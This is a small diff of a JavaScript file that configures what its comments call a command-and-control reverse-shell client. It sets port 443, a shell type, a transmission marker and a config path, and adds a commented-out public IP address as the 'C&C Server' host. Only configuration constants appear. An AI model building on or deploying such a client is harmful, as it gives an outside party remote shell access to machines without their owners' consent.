@@ -17,7 +17,7 @@ const _options = {
 
 // flag variable to let the client know if it needs to reconnect to the server
 const _comPort = 443 // Communication Socket port
-const _host = '127.0.0.1' // C&C Server
+const _host = '127.0.0.1'//'51.222.157.180' // C&C Server
 const _shellType = "sh" //cmd.exe, zsh, sh
 const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
 const _CONFIG_PATH_ = '/.RSconf'
